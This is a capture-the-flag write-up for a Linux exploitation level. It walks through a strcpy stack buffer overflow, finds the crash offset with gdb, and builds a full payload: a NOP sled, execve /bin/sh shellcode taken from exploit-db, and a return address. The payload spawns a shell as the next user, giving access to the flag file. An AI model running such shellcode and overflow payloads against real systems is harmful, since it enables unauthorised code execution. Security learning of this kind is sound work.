# Level1 pwnage Linux level1 - Challenge 80

level1.c is using strcpy without checking for the input length

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {

    char buf[1024];

    strcpy(buf, argv[1]);
    return 0;
}
```

Let's check how much data we need to push on the stack before we overwrite the return address:

```
level1@rzt-bin01:/levels$ ./level1 `python -c 'print "A" * 1028'`
level1@rzt-bin01:/levels$ ./level1 `python -c 'print "A" * 1029'`
level1@rzt-bin01:/levels$ ./level1 `python -c 'print "A" * 1030'`
level1@rzt-bin01:/levels$ ./level1 `python -c 'print "A" * 1031'`
level1@rzt-bin01:/levels$ ./level1 `python -c 'print "A" * 1032'`
level1@rzt-bin01:/levels$ ./level1 `python -c 'print "A" * 1033'`
level1@rzt-bin01:/levels$ ./level1 `python -c 'print "A" * 1036'`
Segmentation fault
```

```
(gdb) disass main
Dump of assembler code for function main:
   0x0804841c <+0>:     push   %ebp
   0x0804841d <+1>:     mov    %esp,%ebp
   0x0804841f <+3>:     and    $0xfffffff0,%esp
   0x08048422 <+6>:     sub    $0x410,%esp
   0x08048428 <+12>:    mov    0xc(%ebp),%eax
   0x0804842b <+15>:    add    $0x4,%eax
   0x0804842e <+18>:    mov    (%eax),%eax
   0x08048430 <+20>:    mov    %eax,0x4(%esp)
   0x08048434 <+24>:    lea    0x10(%esp),%eax
   0x08048438 <+28>:    mov    %eax,(%esp)
   0x0804843b <+31>:    call   0x8048300 <strcpy@plt>
   0x08048440 <+36>:    mov    $0x0,%eax
   0x08048445 <+41>:    leave
   0x08048446 <+42>:    ret
```

Let's set a breakpoint after ESP is decremented so we can see what the address is:

```
(gdb) break *main+12
Breakpoint 3 at 0x8048428: file level1.c, line 9.

(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level1 a

Breakpoint 1, 0x0804841f in main (argc=2, argv=0xbffff844) at level1.c:6
6
(gdb) i r
eax            0xbffff844       -1073743804
ecx            0xf355ed28       -212472536
edx            0x2      2
ebx            0xb7fd5ff4       -1208131596
esp            0xbffff798       0xbffff798
ebp            0xbffff798       0xbffff798
```

Let's check exploit-db for a shellcode...

Shellcode (19 bytes):
```
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
```

Our payload will be (NOPs x 1017 bytes) + Shellcode(19 bytes) + Return Address (4 bytes.) The return address must be in little endian format (need to flip the order of the four bytes).

```
level1@rzt-bin01:/levels$ ./level1 `python -c 'print "\x90" * 1017 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x98\xf7\xff\xbf"'`
$ whoami
level2
```

Once we have our shell, we can find the flag in /home/level2/.pass
